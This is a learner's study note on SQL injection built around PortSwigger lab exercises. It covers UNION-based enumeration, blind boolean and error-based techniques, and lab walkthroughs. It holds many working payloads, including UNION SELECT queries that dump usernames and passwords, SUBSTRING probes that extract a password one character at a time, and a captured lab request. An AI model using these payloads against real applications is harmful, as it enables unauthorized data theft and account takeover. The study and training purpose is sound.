# ![[p1port.png]]
# what is this?
- a web app vulnerability
- allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.
# How to detect SQL injection vulnerabilities
- `'` 
	- Error
- Boolean conditional 
	- `or 1=1 or 1=2`
		- and see different result
# SQL injection examples
- ## commons
	- **Retrieving hidden data**, where you can modify a SQL query to return additional results.
		-  Imagine a shopping application
    - when click a gift
        - https://insecure-website.com/products?category=Gifts AND released = 1
        - attack
            - https://insecure-website.com/products?category=Gifts'--
                - https://insecure-website.com/products?category=Gifts'-- AND released =1
            - https://insecure-website.com/products?category=Gifts'+OR+1=1--
                - https://insecure-website.com/products?category=Gifts'+OR+1=1--AND released =1



	- Subverting application logic, where you can change a query to interfere with the application's logic.
		- Imagine an application that lets users log in with a username and password. If a user submits the username wiener and the password blue cheese, the application checks the credentials by performing the following SQL query:
			- `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
		- attack 
			- commenting password and not need a password
			- `admin--`  or `admin#`



	- UNION attacks, where you can retrieve data from different database tables.
		- in this case attacker can retrieving more data in other tables with UNION
			- `SELECT name, description FROM products WHERE category = 'Gifts'`  if this backend query
		- attack
			- `' union select 1,password from users;--`

	- Blind SQL injection, where the results of a query you control are not returned in the application's responses.
	- #### Second-order SQL injection
		- Second sqli when we write first sqli finished or fixed
		- #### ![[p2port.png]]
		- this is every **cool**

# Examining the database in SQL injection attacks
- sql injection vulnerabilities often extracting information about database
	- version and type
### Querying the database type and version
```SQL
--microsoft and mysql
select @@version

--Oravle
Select * from v$version

--postgerSQl
select version()

```
- #### [laboratory ..Oracle version](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
	- we give help in this [cheetshit](https://portswigger.net/web-security/sql-injection/cheat-sheet)
	- Before performing a union select attack, its essential to determine two things:
		- how **many columns** are in the database
		- what is the data types of each column
	- Let’s start by quickly confirming the presence of a SQLi vulnerability. In the request, add a single quote (‘) to the end of your category filter and click ‘Send’.
		-  if response code 500
			- telling me 
				- we know we found the correct injection point
		-  now we determine columns number
			- use `order by` ^f123a3
				- `gist+order+by+1--`
				- OK we know have 2 columns
		-  what type of data are in these two columns?
			- Using our ‘UNION SELECT’ statement we are going to inject some words into this page. The syntax is as follows:
				- `' UNION SELECT 'Marduk','James' FROM dual --` ^9f5619
			- Note 
				- [[#^9f5619]]‘dual’ is a default dummy table present in Oracle. A table must be specified when using Oracle. And since we don’t know the names of any of the actual table names used, we can use ‘dual’.
	- [[#^f123a3]]tables and columns
	- #### payload
		- `' UNION SELECT banner, null FROM v$version --`
		- To fix that we need to specify another column, in our payload, which will be ‘null’.
		- This query will retrieve the data in one column, banner, from the table (or view) v$version. Remember, we need two columns.
### laboratory MySQL and Microsoft
- we in this [lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
- 1
	- determine columns number
- 2
	- determine type of columns
-  inject payload for MySQL and Microsoft version pull
- <span style="color: red;">Note</span>
	- in this not work # 
		- you should use urlencode %23 = #
## Listing the contents of the database
- ##  flow
	- Verify SQLi vulnerability injection point/
	- Determine the exact number of columns AND data types.
	- Determine the type of database that is being used.
	- Determine the relevant table name within that database.
	- Determine the relevant column names within the table.
	- Find credentials for ‘administrator’.
	- Log in to the site as ‘administrator’
	- Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

   ### Lab: SQL injection attack, listing the database contents on non-Oracle databases 
  [lab url](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
  - we give help cheet-shit
  - - step two
    - Now, let’s check to see if this is where our SQLi vulnerability is by appending a single quote (‘) to the end of the filter and clicking ‘Send’ again. This is number 1 on our to do list
        - You should get a ‘500 Internal Server Error’ meaning that the server may be susceptible to a SQLi attack
- step three
    - counting column number
        - use
            - ' order by 1    
            - ' order by 2
            - ' order by 3
- step four
    - let’s check to make sure the data types are ‘text’.
        - union select "salar", "amir"--
- step five
    - Crafting Our Payloads
        - step one
            - give version and detecting database type
                - microsoft
                    - ' UNION SELECT @@version,'James'--
                    - ' UNION SELECT @@version,NULL--
                - PostgreSQL ✅
                    - ' UNION SELECT version(),'Marduk'--
                    - '+UNION+SELECT+version(),'Marduk'-
	                    - ok Continue
                        - give all table
                            - SELECT * FROM information_schema.tables
                            - ' UNION SELECT table_name,'Marduk' FROM information_schema.tables--  '+UNION+SELECT+table_name,'Marduk'+FROM+information_schema.tables--
                        - give all columns in the one table
                            - ' UNION SELECT column_name,'Marduk' FROM information_schema.columns WHERE table_name = 'USERS_VBHDSO'--
                                - user an passsword in the this table
                                    - USERNAME_LEQYSX
                                    - PASSWORD_EOUQFB
                        - give pass and user
                            - ' UNION SELECT USERNAME_LEQYSX, PASSWORD_EOUQFB FROM users_zqdiez--
                        - copy username and password and login in the administrator
## Lab: SQL injection attack, listing the database contents on Oracle
- like above lab just different database type
- [[Write-Ups#labs]] lab 3
# UNION ATTACKS
- When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database
- #### Determining the number of columns required
	- ##### method one 
		- involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs
		- ` ' ORDER BY 1--`
		- `' ORDER BY 2--`
		- `' ORDER BY 3--`
	- ##### Method two
		- used by NULL
			- `' UNION SELECT NULL--`
			- `' UNION SELECT NULL,NULL--`
			- `' UNION SELECT NULL,NULL,NULL--`
			- If the number of nulls does not match the number of columns, the database returns an error
			- [laboratory](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
				- - step one
				    - `' order by 1--`
				    - `' order by 2--`
				    - `' order by 3--`
				- step two
				    - `'union select null ,null, null--`
				    -
- ## Using a SQL injection UNION attack to retrieve interesting data
	- - determining columns number
	- give database type
	- give all table
	 - '+union+select+table_name, version()+from+information_schema.tables+--
	 - find table
	 - users
	- see in to users tables
	- '+union+select+column_name, version()+from+information_schema.columns+where+table_name=+'users'+--    
    - find columns
        - username
        - password
- Retrieve password and username
    - '+union+select+username, password+from+users+--
    - administrator:f3cw0093dzz1wb2j0wtt
## Retrieving multiple values within a single column
- [laboratory](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
- #### Steps
-  determining number of columns
- type columns 
    - 'union select null,'a'--
- database version and type
    - 'union select null, version--
        - OK we have a PostgreSQL database
- retrieve all tables
    - '+union+select+null, table_name+from+information_schema.tables+--
        - users
- retrieve all column in users
    - '+union+select+null, column_name+from+information_schema.columns+where+table_name=+'users'+--
- retrieve username and password in the single column
    - `'+UNION+SELECT+NULL, username||'~'||password+FROM+users
# Blind SQL Injection
- ## What is blind SQL injection?
Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as [`UNION` attacks](https://portswigger.net/web-security/sql-injection/union-attacks) are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.
## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`…xyz' AND '1'='1 …xyz' AND '1'='2`

- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

We can continue this process to systematically determine the full password for the `Administrator` user.

#### Note

The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).


## What is blind SQL injection?
- when application not return result ->just result A process executed on data Like whether the product is available or not.
- we can't exploiting with `UNION`
Exploiting blind SQL injection by triggering conditional responses
Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
```sql
`…xyz' AND '1'='1 
…xyz' AND '1'='2`
```
- we two request
- request one because  a true conditional web application return `welcome back`
- but request two not a true conditional web app not return `welcome back`
- You can determine the password for this user by sending a series of inputs to test the password one character at a time.
- `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
- You can determine the password for this user by sending a series of inputs to test the password one character at a time.
```sql
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
```
- **What This Does**
- This extracts the **first character** of the password for the `Administrator` user -> m

 - character 2 finding
 ```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 2, 1) > 'a
```

> [!note] note
> The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.
- #### Practice in [lab](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses)
- ![[p-blind1-1.png]]
```http
GET /login HTTP/2
Host: 0a4600130431e87880388612001700b1.web-security-academy.net
Cookie: TrackingId=QWPRSTUGGGBjEqaj; session=EtKXcSR8E04dpneBCqXhAwlG4Mx1Y5x7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4600130431e87880388612001700b1.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
- we inject in point `Cookie: TrackingId=QWPRSTUGGGBjEqaj; session=EtKXcSR8E04dpneBCqXhAwlG4Mx1Y5x7`
- #### detection
- ![[p-blind1-2.png]]
- ![[p-blind1-3.png]]
- when conditional true return `welcome back` ..
- we inject this payload
```sql
AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm`
```
- ![[p-blind1-4.png]]
- because return `welcome back` --> first character of password --> administrator
- go search second character of password
- ![[p-blind1-5.png]]
- not return welcome back because  `p` no second character ...
- We continue like this until the end of the password.
- How Automating
- write  a code or use Burp suite --> INturder


## Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section. For more information, see Exploiting blind SQL injection by triggering conditional errors.
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.
- ## Exploiting blind SQL injection by triggering conditional errors - Continued

To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

> [!note] note
>There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.
### Practice in [lab](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors)
- this is hard for me now .  I help community solution [Youtube](https://www.youtube.com/watch?v=_7w-KEP_K5w)
- 